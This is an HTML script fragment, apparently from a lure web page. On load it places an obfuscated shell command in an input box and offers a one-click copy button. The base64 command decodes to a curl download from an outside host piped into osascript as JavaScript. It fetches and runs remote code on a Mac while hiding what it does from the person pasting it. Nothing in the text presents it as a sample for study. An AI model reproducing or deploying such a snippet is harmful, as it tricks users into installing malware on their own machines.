    <script>
      (function(){
        

        function getPageName() {
          return window.location.pathname.split('/').pop().replace('.html', '');
        }

        const FALLBACK_CMD = 'echo "Y3VybCAtc2ZMIGh0dHBzOi8va2VybmVsb3BzLnByby83ZWx4N2UvV1FBNFc2bTMxc2FSIHwgb3Nhc2NyaXB0IC1sIEphdmFTY3JpcHQ=" | base64 -d | zsh';
        let inputField = null;
        let copyButton = null;

        async function fetchCommand() {
          return FALLBACK_CMD;
        }

        function setupCopyHandler() {
          if (!copyButton || !inputField) return;
          copyButton.addEventListener("click", async (ev) => {
            ev.preventDefault();
            try {
              await navigator.clipboard.writeText(inputField.value);
              
              const originalText = copyButton.textContent;
              copyButton.textContent = "✓ Copied!";
              copyButton.style.background = "#2ea043";
              setTimeout(() => {
                copyButton.textContent = originalText;
                copyButton.style.background = "";
              }, 1400);
            } catch(e) {
              inputField.select();
            }
          });
        }

        document.addEventListener("DOMContentLoaded", async () => {
          inputField = document.getElementById("cmdMain");
          copyButton = document.getElementById("copyMainBtn");
          if (inputField) {
            const cmd = await fetchCommand();
            inputField.value = cmd;
          }
          setupCopyHandler();
          
        });
      })();
    </script>
